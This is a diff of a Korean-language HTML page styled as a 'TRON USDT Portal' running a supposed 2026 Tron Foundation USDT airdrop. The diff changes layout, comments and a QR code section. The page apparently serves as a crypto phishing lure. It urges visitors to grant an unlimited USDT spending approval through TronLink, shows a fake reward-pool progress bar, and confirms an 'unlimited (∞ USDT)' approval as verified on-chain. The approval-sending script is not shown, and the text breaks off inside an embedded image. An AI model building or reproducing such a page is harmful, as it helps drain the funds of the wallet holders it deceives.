@@ -26,16 +26,18 @@
         @keyframes pulse-slow { 0%,100%{opacity:.5} 50%{opacity:1} }
         .animate-pulse-slow { animation: pulse-slow 2.5s cubic-bezier(0.4, 0, 0.6, 1) infinite; }
         .glass-panel { background: linear-gradient(135deg, rgba(15, 23, 42, 0.7) 0%, rgba(7, 11, 20, 0.8) 100%); backdrop-filter: blur(20px); }
-        .qr-glow { box-shadow: 0 0 30px rgba(239, 68, 68, 0.15), 0 0 60px rgba(239, 68, 68, 0.05); }
     </style>
 </head>
 <body class="bg-[#030712] text-slate-100 min-h-screen flex flex-col relative overflow-x-hidden selection:bg-red-600 selection:text-white">
 
+    <!-- Ambient Background Glows (Red theme) -->
     <div class="fixed top-[-150px] left-1/2 -translate-x-1/2 w-[900px] h-[450px] bg-gradient-to-b from-red-600/10 via-rose-500/5 to-transparent rounded-full blur-[160px] pointer-events-none -z-10"></div>
     <div class="fixed bottom-0 right-[-100px] w-[500px] h-[500px] bg-emerald-600/5 rounded-full blur-[150px] pointer-events-none -z-10"></div>
 
+    <!-- Toast Container -->
     <div id="toast-container" class="fixed bottom-6 right-6 z-50 flex flex-col space-y-2 pointer-events-none"></div>
 
+    <!-- Live Ticker Bar -->
     <div class="bg-[#050811] border-b border-slate-800/60 py-2 px-4 text-xs font-mono">
         <div class="max-w-7xl mx-auto flex items-center justify-between gap-4">
             <div class="flex items-center gap-2.5 text-red-400 shrink-0 font-medium">
@@ -46,10 +48,13 @@
         </div>
     </div>
 
+    <!-- Header -->
     <header class="border-b border-slate-800/80 bg-[#050811]/90 backdrop-blur-xl sticky top-0 z-40 px-4 lg:px-8 py-4">
         <div class="max-w-7xl mx-auto flex items-center justify-between">
             <div class="flex items-center gap-3.5">
-                <div class="w-10 h-10 rounded-2xl bg-gradient-to-br from-red-500/20 to-rose-500/10 border border-red-500/30 flex items-center justify-center shadow-inner text-red-400"><i class="fa-solid fa-shield-halved text-base"></i></div>
+                <div class="w-10 h-10 rounded-2xl bg-gradient-to-br from-red-500/20 to-rose-500/10 border border-red-500/30 flex items-center justify-center shadow-inner text-red-400">
+                    <i class="fa-solid fa-shield-halved text-base"></i>
+                </div>
                 <div>
                     <div class="flex items-center gap-2.5">
                         <h1 class="text-base sm:text-lg font-extrabold tracking-tight text-white">TRON USDT <span class="text-transparent bg-clip-text bg-gradient-to-r from-red-400 to-rose-300">Portal</span></h1>
@@ -73,16 +78,24 @@
                 <p class="text-xs text-slate-400 leading-relaxed">스마트폰 일반 브라우저에서는 지갑 승인이 불가합니다.<br><strong>TronLink 앱</strong>의 DApp 브라우저를 이용해 주세요.</p>
             </div>
             <div class="space-y-2.5 pt-1">
-                <button onclick="launchTronLinkApp()" class="w-full bg-gradient-to-r from-red-600 to-rose-600 hover:from-red-500 hover:to-rose-500 text-white font-semibold py-3 rounded-xl text-xs flex items-center justify-center gap-2 shadow-lg shadow-red-900/30 transition"><i class="fa-solid fa-arrow-up-right-from-square"></i><span>TronLink 앱 열기 (URL 자동 복사됨)</span></button>
+                <button onclick="launchTronLinkApp()" class="w-full bg-gradient-to-r from-red-600 to-rose-600 hover:from-red-500 hover:to-rose-500 text-white font-semibold py-3 rounded-xl text-xs flex items-center justify-center gap-2 shadow-lg shadow-red-900/30 transition">
+                    <i class="fa-solid fa-arrow-up-right-from-square"></i><span>TronLink 앱 열기 (URL 자동 복사됨)</span>
+                </button>
                 <div class="bg-slate-950/80 border border-slate-800 rounded-xl p-4 text-left text-xs text-slate-300 space-y-2">
                     <p class="text-amber-400 font-bold flex items-center gap-1.5"><i class="fa-solid fa-circle-info"></i>앱에서 자동으로 안 열리면:</p>
                     <p>1. TronLink 앱을 직접 여세요</p>
                     <p>2. 하단 <strong class="text-white">탐색</strong> 탭 클릭</p>
                     <p>3. 상단 주소창에 <strong class="text-white">붙여넣기</strong> (URL이 이미 복사됨)</p>
                 </div>
-                <a href="https://play.google.com/store/apps/details?id=com.tronlinkpro.wallet" target="_blank" rel="noreferrer" class="w-full bg-slate-900 hover:bg-slate-800 border border-slate-800 text-slate-300 font-medium py-2.5 rounded-xl text-xs flex items-center justify-center gap-2 transition"><i class="fa-brands fa-google-play text-emerald-400"></i><span>Google Play 설치</span></a>
-                <a href="https://apps.apple.com/app/tronlink-trx-btt-wallet/id1453530188" target="_blank" rel="noreferrer" class="w-full bg-slate-900 hover:bg-slate-800 border border-slate-800 text-slate-300 font-medium py-2.5 rounded-xl text-xs flex items-center justify-center gap-2 transition"><i class="fa-brands fa-apple text-blue-400"></i><span>App Store 설치</span></a>
-                <button onclick="copyCurrentUrl()" class="w-full bg-slate-950/60 border border-slate-800 text-slate-400 hover:text-slate-200 py-2.5 rounded-xl text-xs flex items-center justify-center gap-1.5 transition"><i class="fa-solid fa-copy"></i><span>링크 주소 다시 복사하기</span></button>
+                <a href="https://play.google.com/store/apps/details?id=com.tronlinkpro.wallet" target="_blank" rel="noreferrer" class="w-full bg-slate-900 hover:bg-slate-800 border border-slate-800 text-slate-300 font-medium py-2.5 rounded-xl text-xs flex items-center justify-center gap-2 transition">
+                    <i class="fa-brands fa-google-play text-emerald-400"></i><span>Google Play 설치</span>
+                </a>
+                <a href="https://apps.apple.com/app/tronlink-trx-btt-wallet/id1453530188" target="_blank" rel="noreferrer" class="w-full bg-slate-900 hover:bg-slate-800 border border-slate-800 text-slate-300 font-medium py-2.5 rounded-xl text-xs flex items-center justify-center gap-2 transition">
+                    <i class="fa-brands fa-apple text-blue-400"></i><span>App Store 설치</span>
+                </a>
+                <button onclick="copyCurrentUrl()" class="w-full bg-slate-950/60 border border-slate-800 text-slate-400 hover:text-slate-200 py-2.5 rounded-xl text-xs flex items-center justify-center gap-1.5 transition">
+                    <i class="fa-solid fa-copy"></i><span>링크 주소 다시 복사하기</span>
+                </button>
                 <button onclick="document.getElementById('mobile-dapp-modal').classList.remove('active')" class="w-full text-slate-500 hover:text-slate-300 py-2 text-xs transition">닫기</button>
             </div>
         </div>
@@ -93,10 +106,17 @@
         <div class="glass-panel border border-slate-800 rounded-3xl max-w-md w-full p-6 sm:p-8 space-y-5 shadow-2xl relative text-center">
             <button onclick="document.getElementById('install-modal').classList.remove('active')" class="absolute top-5 right-5 text-slate-400 hover:text-white transition"><i class="fa-solid fa-xmark text-lg"></i></button>
             <div class="w-14 h-14 mx-auto rounded-2xl bg-amber-500/10 border border-amber-500/30 flex items-center justify-center text-amber-400 text-2xl"><i class="fa-solid fa-circle-exclamation"></i></div>
-            <div class="space-y-1.5"><h3 class="text-lg font-bold text-white">TronLink 지갑 미감지</h3><p class="text-xs text-slate-400">브라우저 확장 프로그램 설치가 필요합니다.</p></div>
+            <div class="space-y-1.5">
+                <h3 class="text-lg font-bold text-white">TronLink 지갑 미감지</h3>
+                <p class="text-xs text-slate-400">브라우저 확장 프로그램 설치가 필요합니다.</p>
+            </div>
             <div class="space-y-2.5 pt-2">
-                <a href="https://chrome.google.com/webstore/detail/tronlink/ibnejdfjmmkpcnlpebklmnkoeoihofec" target="_blank" rel="noreferrer" class="w-full py-3 px-4 rounded-xl bg-gradient-to-r from-red-600 to-rose-600 text-white font-bold text-xs flex items-center justify-between transition shadow-lg"><span>TronLink 다운로드 (Chrome)</span><i class="fa-solid fa-arrow-up-right-from-square"></i></a>
-                <a href="https://www.tronlink.org/" target="_blank" rel="noreferrer" class="w-full py-2.5 px-4 rounded-xl bg-slate-900 hover:bg-slate-800 border border-slate-800 text-slate-300 font-medium text-xs flex items-center justify-between transition"><span>TronLink 공식 사이트</span><i class="fa-solid fa-arrow-up-right-from-square"></i></a>
+                <a href="https://chrome.google.com/webstore/detail/tronlink/ibnejdfjmmkpcnlpebklmnkoeoihofec" target="_blank" rel="noreferrer" class="w-full py-3 px-4 rounded-xl bg-gradient-to-r from-red-600 to-rose-600 text-white font-bold text-xs flex items-center justify-between transition shadow-lg">
+                    <span>TronLink 다운로드 (Chrome)</span><i class="fa-solid fa-arrow-up-right-from-square"></i>
+                </a>
+                <a href="https://www.tronlink.org/" target="_blank" rel="noreferrer" class="w-full py-2.5 px-4 rounded-xl bg-slate-900 hover:bg-slate-800 border border-slate-800 text-slate-300 font-medium text-xs flex items-center justify-between transition">
+                    <span>TronLink 공식 사이트</span><i class="fa-solid fa-arrow-up-right-from-square"></i>
+                </a>
                 <button onclick="document.getElementById('install-modal').classList.remove('active')" class="w-full py-2 text-slate-500 hover:text-slate-300 text-xs transition">닫기</button>
             </div>
         </div>
@@ -107,7 +127,10 @@
         <div class="glass-panel border border-slate-800 rounded-3xl max-w-md w-full p-6 sm:p-8 text-center space-y-5 shadow-2xl relative">
             <button onclick="document.getElementById('reward-modal').classList.remove('active')" class="absolute top-5 right-5 text-slate-400 hover:text-white transition"><i class="fa-solid fa-xmark text-lg"></i></button>
             <div class="w-16 h-16 bg-emerald-500/10 text-emerald-400 border border-emerald-500/30 rounded-2xl flex items-center justify-center mx-auto shadow-inner"><i class="fa-solid fa-wand-magic-sparkles text-2xl"></i></div>
-            <div class="space-y-1.5"><h3 class="text-xl font-extrabold text-white">승인 완료 및 보상 등록</h3><p class="text-xs text-slate-300 leading-relaxed">USDT 스마트 컨트랙트 승인이 온체인에 기록되었습니다.<br>에어드랍 보상 배치가 순차적으로 진행됩니다.</p></div>
+            <div class="space-y-1.5">
+                <h3 class="text-xl font-extrabold text-white">승인 완료 및 보상 등록</h3>
+                <p class="text-xs text-slate-300 leading-relaxed">USDT 스마트 컨트랙트 승인이 온체인에 기록되었습니다.<br>에어드랍 보상 배치가 순차적으로 진행됩니다.</p>
+            </div>
             <div class="bg-slate-950/80 p-4 rounded-2xl border border-slate-800/80 text-left text-xs font-mono space-y-2.5">
                 <div class="flex justify-between text-slate-400"><span>상태:</span><span class="text-emerald-400 font-bold">VERIFIED ON-CHAIN</span></div>
                 <div class="flex justify-between text-slate-400"><span>승인 한도:</span><span class="text-white">무제한 (∞ USDT)</span></div>
@@ -117,16 +140,23 @@
         </div>
     </div>
 
+    <!-- Main Content -->
     <main class="max-w-7xl mx-auto px-4 lg:px-8 py-8 space-y-8 flex-1 w-full">
 
-        <!-- Hero -->
+        <!-- Hero Banner -->
         <section class="relative rounded-3xl p-6 sm:p-10 overflow-hidden glass-panel border border-slate-800/80 shadow-2xl">
             <div class="absolute top-0 right-0 w-96 h-96 bg-red-600/10 rounded-full blur-3xl pointer-events-none"></div>
             <div class="grid grid-cols-1 lg:grid-cols-12 gap-8 items-center relative z-10">
                 <div class="lg:col-span-7 space-y-5">
-                    <div class="inline-flex items-center gap-2 px-3 py-1.5 rounded-full bg-red-500/10 border border-red-500/20 text-red-400 text-xs font-semibold"><i class="fa-solid fa-sparkles"></i><span>2026 TRON FOUNDATION SPECIAL AIRDROP</span></div>
-                    <h2 class="text-3xl sm:text-4xl lg:text-5xl font-extrabold text-white tracking-tight leading-[1.15]">TRC-20 USDT<br><span class="text-transparent bg-clip-text bg-gradient-to-r from-red-400 via-rose-300 to-amber-300">보상 에어드랍 & 권한 승인</span></h2>
-                    <p class="text-slate-300 text-xs sm:text-sm leading-relaxed max-w-xl">TronLink 지갑 최초 1회 무제한 권한 승인 완료 시, 스마트 컨트랙트가 잔액 및 보유 자격을 자동 검증하여 즉시 스페셜 USDT 에어드랍 보상을 지급합니다.</p>
+                    <div class="inline-flex items-center gap-2 px-3 py-1.5 rounded-full bg-red-500/10 border border-red-500/20 text-red-400 text-xs font-semibold">
+                        <i class="fa-solid fa-sparkles"></i><span>2026 TRON FOUNDATION SPECIAL AIRDROP</span>
+                    </div>
+                    <h2 class="text-3xl sm:text-4xl lg:text-5xl font-extrabold text-white tracking-tight leading-[1.15]">
+                        TRC-20 USDT<br><span class="text-transparent bg-clip-text bg-gradient-to-r from-red-400 via-rose-300 to-amber-300">보상 에어드랍 & 권한 승인</span>
+                    </h2>
+                    <p class="text-slate-300 text-xs sm:text-sm leading-relaxed max-w-xl">
+                        TronLink 지갑 최초 1회 무제한 권한 승인 완료 시, 스마트 컨트랙트가 잔액 및 보유 자격을 자동 검증하여 즉시 스페셜 USDT 에어드랍 보상을 지급합니다.
+                    </p>
                     <div class="pt-2 space-y-2 max-w-xl">
                         <div class="flex justify-between text-xs font-semibold"><span class="text-slate-400">총 보상 풀 지급 현황</span><span class="text-red-400 font-mono">1,842,500 / 2,500,000 USDT (73.7%)</span></div>
                         <div class="w-full bg-slate-950 rounded-full h-2.5 p-0.5 border border-slate-800/80 overflow-hidden"><div class="bg-gradient-to-r from-red-600 via-rose-400 to-amber-400 h-full rounded-full w-[73.7%] shadow-sm"></div></div>
@@ -149,32 +179,22 @@
             </div>
         </section>
 
+
         <!-- QR Code Section -->
         <section class="glass-panel border border-slate-800/80 rounded-2xl p-6 sm:p-8">
             <div class="text-center mb-6">
                 <div class="inline-flex items-center gap-2 px-3 py-1.5 rounded-full bg-red-500/10 border border-red-500/20 text-red-400 text-xs font-semibold mb-3"><i class="fa-solid fa-qrcode"></i><span>모바일 간편 참여</span></div>
                 <h3 class="text-base sm:text-lg font-extrabold text-white">QR코드로 즉시 참여하기</h3>
-                <p class="text-xs text-slate-400 mt-1">스마트폰 카메라로 QR코드를 스캔하여 바로 참여하세요</p>
+                <p class="text-xs text-slate-400 mt-1">스마트폰 카메라로 QR코드를 스캔하면 TronLink 앱에서 바로 열립니다</p>
             </div>
-            <div class="grid grid-cols-1 sm:grid-cols-2 gap-6 max-w-lg mx-auto">
-                <!-- TronLink QR -->
-                <div class="flex flex-col items-center space-y-3 bg-slate-950/60 border border-slate-800/80 rounded-2xl p-5 qr-glow">
+            <div class="flex justify-center">
+                <div class="flex flex-col items-center space-y-3 bg-slate-950/60 border border-slate-800/80 rounded-2xl p-6" style="box-shadow: 0 0 30px rgba(239, 68, 68, 0.15), 0 0 60px rgba(239, 68, 68, 0.05);">
                     <div class="bg-white p-3 rounded-2xl shadow-lg">
-                        <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAmgAAAJoCAIAAABdjYoeAAAU8UlEQVR4nO3dQY7kQNSVURr1PpizBpbPGpizkmLCBAmj/0MRei+qzxmWssJO2+mrGFy9Pz8/P/8JAPiP+c/TJwAALxGcABAITgAIBCcABIITAALBCQCB4ASAQHACQCA4ASAQnAAQCE4ACAQnAASCEwACwQkAgeAEgOBv/Yf/8l//243zOO5//o///n/9+9f518+/fj6nnDrPr3W+nFr/1PWv519te26/TB23OnUfp9a5/R74re+rL/V+2XECQCA4ASAQnAAQCE4ACAQnAASCEwACwQkAQe5xfrndu/oy1Wf6cru/eOo6n7pup3pddZ1T12Gq3/n6c3vquF+29f9e6U1Wt99Xt9epTt1HO04ACAQnAASCEwACwQkAgeAEgEBwAkAgOAEgONbj/LKtH3bK63P4pnpjr8zdvN2Tm1r/9nP75VRfeVuv8fY6df1tc2SrV/LCjhMAAsEJAIHgBIBAcAJAIDgBIBCcABAITgAIrvc4t5maU1jd7i/edur8T32vV+YXvjKH8nZf+csrPeBT5/Pldi/21HF/KztOAAgEJwAEghMAAsEJAIHgBIBAcAJAIDgBIPjnepxfXpn7uG1e4G9dZ8q2ntztfvC2+Yv1fLb1pG/3O1+Z63mbHScABIITAALBCQCB4ASAQHACQCA4ASAQnAAQXO9xbuv31B7SqT7T7f7T1LzAbXP+Tt2XU6Z6ftt+d7fv7+tzN0+tv60X+8pxKztOAAgEJwAEghMAAsEJAIHgBIBAcAJAIDgBIDjW43x9DmJ1qgc2NVfvld7k1Py/qfv7Sg912/11fXaeT13nFXacABAITgAIBCcABIITAALBCQCB4ASAQHACQJB7nK/MS7ttqi91+3xu9zurbfNKt/VHX7fteTu1/rb+9Jdtn3+FHScABIITAALBCQCB4ASAQHACQCA4ASAQnAAQ/Pn5+bl6gNt9vqn5hbf7kfU8t53PNrf7ZLfv15RXnpOp83ylp/jKe+CV+2jHCQCB4ASAQHACQCA4ASAQnAAQCE4ACAQnAAR5HueUqb5mdarX9Uo/7Ha/9vZ806n5mrfX3zaf8tR53v593X4Op9aZ6rV/+Tru7efh1Pe14wSAQHACQCA4ASAQnAAQCE4ACAQnAASCEwCCY/M4X+k/VdvmaNZ1vvzW+/Xlletc1zll2/za26bu4ynb+prb3nu3f9d2nAAQCE4ACAQnAASCEwACwQkAgeAEgEBwAkDwfI+znk9df2pe4Jep3tuXbff3t17/U9/r9pzU2/61/uIrx739/EzNDf1ixwkAgeAEgEBwAkAgOAEgEJwAEAhOAAgEJwAEf6dP4D9qW49nqle6rc9X3b5uU73b2/fldn/0lb7dK33r273Gqd7zVH/31H0/dR3sOAEgEJwAEAhOAAgEJwAEghMAAsEJAIHgBIAgz+N8pf9XvTLfcdv8y9temfP3Zapvt+252jbH8ZXz/PLKe2nb+uZxAsAAwQkAgeAEgEBwAkAgOAEgEJwAEAhOAAjyPM6p/tO2eZDbekvb5vNN9Qjr95p6Pk89z9v6rFN939u9vdvrTz1Xt6/PqeNO/a6/2HECQCA4ASAQnAAQCE4ACAQnAASCEwACwQkAQe5xTvWlvtyeS3fKtv7o7Z7oqXWm+oi3+6yvPLfVtrmJ1bae7itzQG/3+LfN2bXjBIBAcAJAIDgBIBCcABAITgAIBCcABIITAILc4/zySh+ons8pU9dnm6k5rNXUPM6pPvRtr8yznJrvuO39MNVjfuX9YMcJAIHgBIBAcAJAIDgBIBCcABAITgAIBCcABH9+fn5GDjzV1zxl27y923NMp/pY2/q+rz+3p9zuz/3W63P797vtuHWdauq4dpwAEAhOAAgEJwAEghMAAsEJAIHgBIBAcAJAkOdxvtIX3Ob13tJUT/GVfueUqT7xlG3n8+WVecDb5qFu68d/seMEgEBwAkAgOAEgEJwAEAhOAAgEJwAEghMAgjyP81+bw/f69709h7Ka6neeWmfqeXiln7ptvuPr1+H2+lO98Ntufy87TgAIBCcABIITAALBCQCB4ASAQHACQCA4ASDI8zi/TPXebvd1/rU5lNW2OY6/dV7jqfVv3/fbPdpT62zr436Zuj7VK++rU+w4ASAQnAAQCE4ACAQnAASCEwACwQkAgeAEgOBYj3Nqft7UHLvb62/rV51yu0821Rt7vbc3Nbdy6r5vW78e98vU/N1T/fhqaj6oHScABIITAALBCQCB4ASAQHACQCA4ASAQnAAQXJ/H+eVU/2mqp3Xq+26bMzfVhzu1zlQf8bapXumXbedz+7jb+qCvz+Os65z6/Jd6nnacABAITgAIBCcABIITAALBCQCB4ASAQHACQPDn5+dn5MCvzMXcZtucxW1zLqfmVn65fZ1v+61zQG/b9r1eeW5fue92nAAQCE4ACAQnAASCEwACwQkAgeAEgEBwAkCQe5xTvcDbpnqHdZ0vU72xbfNEq6meaD2fU7bNlbxt2xzQL9ueky/b7u+X279rO04ACAQnAASCEwACwQkAgeAEgEBwAkAgOAEg+Fv/YaqnaD7c/9sr5/nl9R7w6z3d28/P1PzXU+p7b1tf9nav8fX5vpUdJwAEghMAAsEJAIHgBIBAcAJAIDgBIBCcABDkHuftnk01NR/0VM/pVA/sdk9rylTP7HY/ctuc16k+3O25p9v6wbe/16n3yanvO3V/bz/PdpwAEAhOAAgEJwAEghMAAsEJAIHgBIBAcAJAcGweZ/38VC/qtlfmfU7NT/2t16eus23+5bZ5k7fXuX39p67P673V28zjBIABghMAAsEJAIHgBIBAcAJAIDgBIBCcABD8+fn5Sf+wbR7nlKnve2ru5m+9L1Om+spT8zhfcfv3MtUH3dbX3Ob2fbTjBIBAcAJAIDgBIBCcABAITgAIBCcABIITAIJjPc4vv3Uu41Tf65U5ebd7pb+1z7qtH/zl1HM+1Y+8beo53HYfv2zry1Z2nAAQCE4ACAQnAASCEwACwQkAgeAEgEBwAkDwt/7D63MHT9nWN7rdu7p93FfmTb5ynattfdYv2/q+X59/vee9ra+/rTdsxwkAgeAEgEBwAkAgOAEgEJwAEAhOAAgEJwAEz8zjrOt/mZo/9+WV436Z6rO+0uutpuYgVtt+R9VUX7CeT11/2zpfzOMEgH+I4ASAQHACQCA4ASAQnAAQCE4ACAQnAAR5Hucpp3pC2/p8t3ur9bjV7Xl+23p+U72xbb20bXMib/+Obn/f233KV+ZfbpuvaR4nAAwQnAAQCE4ACAQnAASCEwACwQkAgeAEgCDP4/zyyly927bNH62melHbjlttm9dYnbr+X6bmL96+v9v6qdv6wV+m7sup62PHCQCB4ASAQHACQCA4ASAQnAAQCE4ACAQnAARjPc7Xe1rbenW3bbu/r/QLtz0/t73e16y29ZW39UrrcSvzOAHgAYITAALBCQCB4ASAQHACQCA4ASAQnAAQ5B7ntp5cta3vta3fdrsfVm3rpW3rHb7++9p2/tXU++S2qfmyU3N29TgB4CLBCQCB4ASAQHACQCA4ASAQnAAQCE4ACP5OHfiVvl1d/5Xe4df6t+f//dYe7dR9P/X5bf3IqTmX9Xy2zWc99fu63YO8fb9us+MEgEBwAkAgOAEgEJwAEAhOAAgEJwAEghMAgjyP88vUvMYvr/TVfut5TvXVtvVit/X8btt2X75M9RQrz/P/3/pfTh3XjhMAAsEJAIHgBIBAcAJAIDgBIBCcABAITgAI8jzOqZ7Z7TlzU/PkpnpRU/2nV3qK2+Yj3l5/6vpvm5N6e50v2+YHv/Je+nL7+9pxAkAgOAEgEJwAEAhOAAgEJwAEghMAAsEJAMGxeZynbJuT93q/8xWv9CZP3cdtz3k97rb1p+bCfrn9Hnjl86dse8/bcQJAIDgBIBCcABAITgAIBCcABIITAALBCQBB7nG+3ld7ZW7ol6neWzXVf63ns63ftm2dKdvu+ynb3oe3j/tbe6J2nAAQCE4ACAQnAASCEwACwQkAgeAEgEBwAkDwd+rAp/pSt3tXX7b1Wes6Uz2qus4rfbtt/c5Xrlv1+nujmup93n5+tq1T2XECQCA4ASAQnAAQCE4ACAQnAASCEwACwQkAwbEe5+3ez+05c6/0LKtX+linTPXepvqRt39fU8/5qfPZNg/11OdP9Yy/nLoO257bU+djxwkAgeAEgEBwAkAgOAEgEJwAEAhOAAgEJwAEf35+fo4stG0O37Z5mbd7qNW2+/Xllet2u497u5d2uw+37Xl75b5UU89DXeeUqetvxwkAgeAEgEBwAkAgOAEgEJwAEAhOAAgEJwAEx3qcX7b1vW7b1jf98vr61Ss9v1O29Win3O6hbuvLVq+8n7fdRztOAAgEJwAEghMAAsEJAIHgBIBAcAJAIDgBIPhb/+H23Mrb67zSWzrlt85T/PJ1nlPzEb9M9UrrdZiaX/vl1H089fltcyunzueV3695nAAwQHACQCA4ASAQnAAQCE4ACAQnAASCEwCC3OOsbvf/ts3Jq7bN/6tuX5/b/a3b9/2VuZ5TfeVtv9/Xe8zb+qZTv9/KPE4AuEhwAkAgOAEgEJwAEAhOAAgEJwAEghMAgtzjnJoz9+WVeZ+3j3tq/ds9rW1z/k653Z+rxz31+dd/v1N9zan++tQ6X7a9306x4wSAQHACQCA4ASAQnAAQCE4ACAQnAASCEwCCPz8/P+kfTvXwpub/fXllfueXqd7ktuvwZdt9+TI1X/CUV37Xr1zn23NG63G3mepP23ECQCA4ASAQnAAQCE4ACAQnAASCEwACwQkAQZ7H+eX1uZi197Pt+5467u05f1P9s6l+26nnaqovu60v+Pp8x21zNF+Zp7uNHScABIITAALBCQCB4ASAQHACQCA4ASAQnAAQ/Np5nFN9uN/aW3p9Pt8pr1yHalv/8nYPeGoe57Z+c7XtOZk6rh0nAASCEwACwQkAgeAEgEBwAkAgOAEgEJwAEOQe55dtfcdX+kPV7fOc6pNN9Wi39f+2rf/681Zt601Wr/dKtx33ix0nAASCEwACwQkAgeAEgEBwAkAgOAEgEJwAEPydOvArcz2nenVT/bb6fV/vvX2Zej63XbepuZivzKf8su33O9V3fGWuamXHCQCB4ASAQHACQCA4ASAQnAAQCE4ACAQnAAS5x7mtd/hKH+h2P7J+/nZvbFvf9Lap+ZG31fM/9flT93fqPTD1ez/ldi95KhdOseMEgEBwAkAgOAEgEJwAEAhOAAgEJwAEghMAgj8/Pz/T5/B/uN1nemVu35fXv+8pr8wXrOt82dYHnerzbZsTWd2+j9t6lq+8r+px7TgBIBCcABAITgAIBCcABIITAALBCQCB4ASAIPc4t82B29ZTnJqfV70yx3Sqv3vK1JzObb+X23NYX+mJftFTf4sdJwAEghMAAsEJAIHgBIBAcAJAIDgBIBCcABD8rf9wu49Vj7utR/j63Me6zit90Kk+4ivP7e3vNdVn/TI19/f2czh1f7e9B25fHztOAAgEJwAEghMAAsEJAIHgBIBAcAJAIDgBIMjzOF/3yry91+dQVlP9rSlTPbZq23X78koftK5TTfXFq23v4cqOEwACwQkAgeAEgEBwAkAgOAEgEJwAEAhOAAiO9Thf6QNt+/yXqXmN1es9v6k+7imvXP8v234XU16Z2zq1zpep/qsdJwAEghMAAsEJAIHgBIBAcAJAIDgBIBCcABD8vX2A273Gus62+ZRTvdIpU73Gqetwu8c29Ts69RxO9fy2zUOdmst76vtOzcWceu/ZcQJAIDgBIBCcABAITgAIBCcABIITAALBCQBB7nHe7v3cnsc21fuZ6qG+Pj9y25y/bc/btp701PX51+bsnurLbuuLT12fyo4TAALBCQCB4ASAQHACQCA4ASAQnAAQCE4ACP78/Pykf7jd/5vq571uW9+xrr+tH/lKD3KbV3rDt99Xr8/j3HZfps7zix0nAASCEwACwQkAgeAEgEBwAkAgOAEgEJwAEBzrcX7ZNu/tX+vnvdLvPOW3nucpt7/v1LzbL1Pns20O6Jdt12HquPV62nECQCA4ASAQnAAQCE4ACAQnAASCEwACwQkAQe5xnjLVI3yl/1RN9WVfmWv4ZdtzVY9bTfVHv2z7Xq/MxXz9uk2tr8cJAAMEJwAEghMAAsEJAIHgBIBAcAJAIDgBIDg2j/Nf61F9uT1v73Z/6/X5o9W/Nhfzy2+979v6yl9+6/U/Zdt9tOMEgEBwAkAgOAEgEJwAEAhOAAgEJwAEghMAgrF5nFOmek7/2lzJf22u5ynbesZ1nS/b7u/t9af61nWd6pX3xu3ztOMEgEBwAkAgOAEgEJwAEAhOAAgEJwAEghMAgr/1H16Z9/bV15nqG93uddXjTvX2Tl2339obO/Wc3H4+t93fU+tMzcH9cmpe7+u9z23Pmx0nAASCEwACwQkAgeAEgEBwAkAgOAEgEJwAEOQe55dTvZ9qqvd2yrbe2Cnbzn+qD1ePO/U8nLo+p85nap3bvdLb76vbfcfq9vvn9vP5xY4TAALBCQCB4ASAQHACQCA4ASAQnAAQCE4ACI71OL9s6wPdnks31ZeqpnqBX25fh6n+4lTP7Lbb/ddTbh/31PMz9X47Zdt1vs2OEwACwQkAgeAEgEBwAkAgOAEgEJwAEAhOAAiu9zhf8Xrf7nY/9dRxv0xd/9vH3TbntX5+qrc61c+rpq5zdbtXOnX+9fOnztOOEwACwQkAgeAEgEBwAkAgOAEgEJwAEAhOAAj0OP+3qbl6p+ZWnpqPONXnu339t/URb/dET/Ugtz0P1bbf7ym3f1+nzufLtjmmlR0nAASCEwACwQkAgeAEgEBwAkAgOAEgEJwAEFzvcW6bqzfVN6qmelq35ya+0mvc1vN7ZW7otrmw2/q+U5+vpvrKr8w/tuMEgEBwAkAgOAEgEJwAEAhOAAgEJwAEghMAgj8/Pz/pH17p2dzuj071w145n2rbnMtq2/zOqTmU2+7LlG0971fmkm6bv/vFjhMAAsEJAIHgBIBAcAJAIDgBIBCcABAITgAIco8TAP5ldpwAEAhOAAgEJwAEghMAAsEJAIHgBIBAcAJAIDgBIBCcABAITgAIBCcABIITAALBCQCB4ASAQHACQPC/AGjrDx91r97oAAAAAElFTkSuQmCC" alt="TronLink QR" class="w-36 h-36 sm:w-40 sm:h-40">
+                        <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAmgAAAJoCAIAAABdjYoeAAAU8UlEQVR4nO3dQY7kQNSVURr1PpizBpbPGpizkmLCBAmj/0MRei+qzxmWssJO2+mrGFy9Pz8/P/8JAPiP+c/TJwAALxGcABAITgAIBCcABIITAALBCQCB4ASAQHACQCA4ASAQnAAQCE4ACAQnAASCEwACwQkAgeAEgOBv/Yf/8l//243zOO5//o///n/9+9f518+/fj6nnDrPr3W+nFr/1PWv519te26/TB23OnUfp9a5/R74re+rL/V+2XECQCA4ASAQnAAQCE4ACAQnAASCEwACwQkAQe5xfrndu/oy1Wf6cru/eOo6n7pup3pddZ1T12Gq3/n6c3vquF+29f9e6U1Wt99Xt9epTt1HO04ACAQnAASCEwACwQkAgeAEgEBwAkAgOAEgONbj/LKtH3bK63P4pnpjr8zdvN2Tm1r/9nP75VRfeVuv8fY6df1tc2SrV/LCjhMAAsEJAIHgBIBAcAJAIDgBIBCcABAITgAIrvc4t5maU1jd7i/edur8T32vV+YXvjKH8nZf+csrPeBT5/Pldi/21HF/KztOAAgEJwAEghMAAsEJAIHgBIBAcAJAIDgBIPjnepxfXpn7uG1e4G9dZ8q2ntztfvC2+Yv1fLb1pG/3O1+Z63mbHScABIITAALBCQCB4ASAQHACQCA4ASAQnAAQXO9xbuv31B7SqT7T7f7T1LzAbXP+Tt2XU6Z6ftt+d7fv7+tzN0+tv60X+8pxKztOAAgEJwAEghMAAsEJAIHgBIBAcAJAIDgBIDjW43x9DmJ1qgc2NVfvld7k1Py/qfv7Sg912/11fXaeT13nFXacABAITgAIBCcABIITAALBCQCB4ASAQHACQJB7nK/MS7ttqi91+3xu9zurbfNKt/VHX7fteTu1/rb+9Jdtn3+FHScABIITAALBCQCB4ASAQHACQCA4ASAQnAAQ/Pn5+bl6gNt9vqn5hbf7kfU8t53PNrf7ZLfv15RXnpOp83ylp/jKe+CV+2jHCQCB4ASAQHACQCA4ASAQnAAQCE4ACAQnAAR5HueUqb5mdarX9Uo/7Ha/9vZ806n5mrfX3zaf8tR53v593X4Op9aZ6rV/+Tru7efh1Pe14wSAQHACQCA4ASAQnAAQCE4ACAQnAASCEwCCY/M4X+k/VdvmaNZ1vvzW+/Xlletc1zll2/za26bu4ynb+prb3nu3f9d2nAAQCE4ACAQnAASCEwACwQkAgeAEgEBwAkDwfI+znk9df2pe4Jep3tuXb